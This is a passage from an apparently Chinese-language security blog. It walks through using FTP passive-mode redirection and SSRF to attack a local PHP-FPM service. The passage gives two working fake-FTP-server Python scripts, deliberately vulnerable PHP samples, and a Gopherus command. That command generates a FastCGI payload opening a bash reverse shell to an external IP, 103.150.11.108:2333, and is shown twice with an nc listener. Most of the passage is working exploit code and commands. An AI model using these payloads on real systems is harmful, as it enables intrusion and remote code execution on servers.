+ 8 &#x3D; 1032 端口。 ​ 这样，假如我们指定 (127,0,0,1,0,9000) ，那么便可以将地址和端口指到 127.0.0.1:9000，也就是本地的 9000 端口。同时由于 FTP 的特性，其会把传输的数据原封不动的发给本地的 9000 端口，不会有任何的多余内容。如果我们将传输的数据换为特定的 Payload 数据，那我们便可以攻击内网特定端口上的应用了。在这整个过程中，FTP 只起到了一个重定向 Payload 的内容。 写入文件例: 1234&lt;?phphighlight_file(__FILE__); file_put_contents($_GET[&#x27;file&#x27;], $_GET[&#x27;data&#x27;]);?&gt; 一个经典的写文件函数,但是假如没有权限写文件我该怎么利用呢?那么就可以利用ssrf来打. ssrf通常能使用gopher:&#x2F;&#x2F;协议来打,但是这个函数不支持,如果内网存在PHP-FPM的话,那么我们就可以利用FTP的被动模式来攻击FPM. 起一个伪ftp客户端: 123456789101112131415161718192021222324252627282930# -*- coding: utf-8 -*-# evil_ftp.pyimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.bind((&#x27;0.0.0.0&#x27;, 23)) # ftp服务绑定23号端口s.listen(1)conn, addr = s.accept()conn.send(b&#x27;220 welcome\\n&#x27;)#Service ready for new user.#Client send anonymous username#USER anonymousconn.send(b&#x27;331 Please specify the password.\\n&#x27;)#User name okay, need password.#Client send anonymous password.#PASS anonymousconn.send(b&#x27;230 Login successful.\\n&#x27;)#User logged in, proceed. Logged out if appropriate.#TYPE Iconn.send(b&#x27;200 Switching to Binary mode.\\n&#x27;)#Size /conn.send(b&#x27;550 Could not get the file size.\\n&#x27;)#EPSV (1)conn.send(b&#x27;150 ok\\n&#x27;)#PASVconn.send(b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\\n&#x27;) #STOR / (2)# &quot;127,0,0,1&quot;PHP-FPM服务为受害者本地，&quot;9000&quot;为为PHP-FPM服务的端口号conn.send(b&#x27;150 Permission denied.\\n&#x27;)#QUITconn.send(b&#x27;221 Goodbye.\\n&#x27;)conn.close() 使用Gopherus生成一个打FPM反弹shell的payload,只取_后面的值. 123python gopherus.py --exploit fastcgi/var/www/html/index.php bash -c &quot;bash -i &gt;&amp; /dev/tcp/103.150.11.108/2333 0&gt;&amp;1&quot; nc监听2333端口,传参即可反弹shell 读取写回文件​ 例如CVE-2021-3129这个漏洞,核心就是传入 file_get_contents() 和 file_put_contents() 这两个函数中的内容没有经过过滤，从而可以通过精巧的构造触发 phar 反序列化，达到RCE的效果. 示例代码: 1234&lt;?php$contents = file_get_contents($_GET[&#x27;viewFile&#x27;]);file_put_contents($_GET[&#x27;viewFile&#x27;], $contents);?&gt; 可以看到,这段代码的主要功能就是先读取一个文件,再把这个文件的内容写到这个文件里,相当于啥也没干. file_get_contents我们经常用来进行ssrf,其支持各种伪协议,假如我们使用ftp协议的话,传入 viewFile=ftp://evil-server/file.txt的话,那么就会发生以下步骤: 先通过file_get_contents()连接到我们的ftp服务器,下载file.txt 再通过file_put_contents()连接到ftp服务器,并将其上传回file.txt ​ 那么我们依旧搭一个evilftp服务器,先从服务器上下载文件后,当他试图传回文件的时候,我们再告诉他把文件发送到127.0.0.1:9000,这样我们就可以向目标主机本地的PHP-FPM发送一个任意的数据包,然后就能任意代码执行了. 依旧使用Gopherus生成payload: 123python gopherus.py --exploit fastcgi/var/www/html/index.php bash -c &quot;bash -i &gt;&amp; /dev/tcp/103.150.11.108/2333 0&gt;&amp;1&quot; evilftpredict.py: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# -*- coding: utf-8 -*-# @Time : 2021/1/13 6:56 下午# @Author : tntaxin# @File : ftp_redirect.py# @Software:import socketfrom urllib.parse import unquote# 对gopherus生成的payload进行一次urldecodepayload = unquote(&quot; &quot;)payload = payload.encode(&#x27;utf-8&#x27;)host = &#x27;0.0.0.0&#x27;port = 23sk = socket.socket()sk.bind((host, port))sk.listen(5)# ftp被动模式的passvie port,监听到1234sk2 = socket.socket()sk2.bind((host, 1234))sk2.listen()# 计数器，用于区分是第几次ftp连接count = 1while 1: conn, address = sk.accept() conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # USER aaa\\r\\n 客户端传来用户名 if count == 1: conn.send(b&quot;220 ready\\n&quot;) else: conn.send(b&quot;200 ready\\n&quot;) print(conn.recv(20)) # TYPE I\\r\\n 客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本 if count == 1: conn.send(b&quot;215 \\n&quot;) else: conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # SIZE /123\\r\\n 客户端询问文件/123的大小 if count == 1: conn.send(b&quot;213 3 \\n&quot;) else: conn.send(b&quot;300 \\n&quot;) print(conn.recv(20)) # EPSV\\r\\n&#x27; conn.send(b&quot;200 \\n&quot;) print(conn.recv(20)) # PASV\\r\\n 客户端告诉服务端进入被动连接模式 if count == 1: conn.send(b&quot;227 127,0,0,1,4,210\\n&quot;) # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234 else: conn.send(b&quot;227 127,0,0,1,35,40\\n&quot;) # 端口计算规则：35*256+40=9000 print(conn.recv(20)) # 第一次连接会收到命令RETR /123\\r\\n，第二次连接会收到STOR /123\\r\\n if count == 1: conn.send(b&quot;125 \\n&quot;) # 告诉客户端可以开始数据连接了 # 新建一个socket给服务端返回我们的payload print(&quot;建立连接!&quot;) conn2, address2 = sk2.accept() conn2.send(payload) conn2.close() print(&quot;断开连接!&quot;) else: conn.send(b&quot;150 \\n&quot;) print(conn.recv(20)) exit() # 第一次连接是下载文件，需要告诉客户端下载已经结束 if count == 1: conn.send(b&quot;226 \\n&quot;) conn.close() count += 1","categories":[],"tags":[]}],"categories":[],"tags":[]}